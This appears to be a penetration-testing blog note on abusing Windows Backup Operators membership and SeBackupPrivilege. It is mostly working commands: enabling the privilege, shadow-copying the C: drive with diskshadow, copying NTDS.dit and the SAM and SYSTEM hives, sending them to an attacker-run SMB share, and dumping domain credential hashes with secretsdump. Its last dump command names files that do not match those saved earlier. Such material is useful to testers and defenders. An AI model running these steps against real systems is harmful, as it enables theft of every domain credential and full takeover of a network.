---
title: Backup Operators
date: 2026-03-06 10:35:59
categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - Groups
tags:
  - backup-operators
  - sebackupprivilege
  - diskshadow
  - ntds
  - active-directory
---

> ➜ Backup Operators is a privileged Windows group whose members can back up and restore files on a system, regardless of file permissions. This group grants powerful privileges such as `SeBackupPrivilege` and `SeRestorePrivilege`, which allow bypassing access controls. These privileges can be abused to `read sensitive files like the SAM, SYSTEM, or NTDS.dit`

## Enabling SeBackupPrivilege

```powershell
PS C:\Users\svc_backup> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========

SeBackupPrivilege             Back up files and directories  Disabled
```

> ➜ In some cases, the privilege is present but disabled by default. So we can enable it using this [PoC](<https://github.com/giuliano108/SeBackupPrivilege>).

```powershell
PS C:\Users\svc_backup> Import-Module .\SeBackupPrivilegeUtils.dll

PS C:\Users\svc_backup> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

```powershell
PS C:\Users\svc_backup> Set-SeBackupPrivilege
PS C:\Users\svc_backup> Get-SeBackupPrivilege
SeBackupPrivilege is enabled
```

```powershell
PS C:\Users\svc_backup> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========

SeBackupPrivilege             Back up files and directories  Enabled
```

## Exploiting Privilege

#### Copying a Protected File

```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

#### NTDS.dit

> Since the NTDS database is actively used by the system and therefore locked by default, we can use the Windows [diskshadow](<https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow>) built-in tool to create a Volume Shadow Copy of the `C:` drive and mount it as the `E:` drive for offline access.

###### Mount the `C:` Drive as a Shadow Copy

```plaintext
PS C:\Users\svc_backup> diskshadow.exe

set context persistent nowriters
set metadata C:\Temp\test.cab
add volume C: alias dfs
create
expose %dfs% K:
exit
```

> ➜ This creates a shadow copy of C: and mounts it as drive K:.

###### Copy NTDS.dit Locally

Using `Robocopy`

```powershell
C:\> robocopy /B K:\Windows\ntds . ntds.dit
```

Using `Copy-FileSeBackupPrivilege`

```powershell
PS C:\> Copy-FileSeBackupPrivilege K:\Windows\NTDS\ntds.dit .\ntds.dit

Copied 16777216 bytes
```

###### Copy the SYSTEM Registry Hive

```powershell
PS C:\Users\svc_backup>  reg save HKLM\SYSTEM SYSTEM.SAV
```

```powershell
PS C:\Users\svc_backup> ls

Mode                LastWriteTime         Length Name
----                -------------         ------ ----

-a----         2/3/2026  11:34 AM       16777216 ntds.dit
-a----         2/3/2026  11:29 AM          12288 SeBackupPrivilegeCmdLets.dll
-a----         2/3/2026  11:29 AM          16384 SeBackupPrivilegeUtils.dll
-a----         2/3/2026  11:34 AM       17645568 SYSTEM.SAV
```

> Now both files are available locally:
> • ntds.dit
> • SYSTEM.SAV

###### Transfer Files to Our Machine

> Create an SMB server

```bash
➜  SeBackupPrivilege sudo impacket-smbserver -smb2support share . -user test -password P@ssw0rd
```

> Mount the share on the target

```plaintext
PS C:\Users\svc_backup> net use n: \\10.10.16.214\share /user:test P@ssw0rd
```

> Copy the files to the share

```powershell
PS C:\Users\svc_backup> copy .\ntds.dit n:\ntds.dit
PS C:\Users\svc_backup> copy .\SYSTEM.SAV  n:\SYSTEM.SAV
```

###### Dump the NTDS Database

```bash
➜  SeBackupPrivilege impacket-secretsdump -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

## Dump SAM

###### Backing up SAM and SYSTEM Registry Hives

```powershell
C:\> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.

C:\> reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```

> ➜ Then transfer the files to our machine

###### Dump the SAM Database

```bash
➜ SeBackupPrivilege impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```
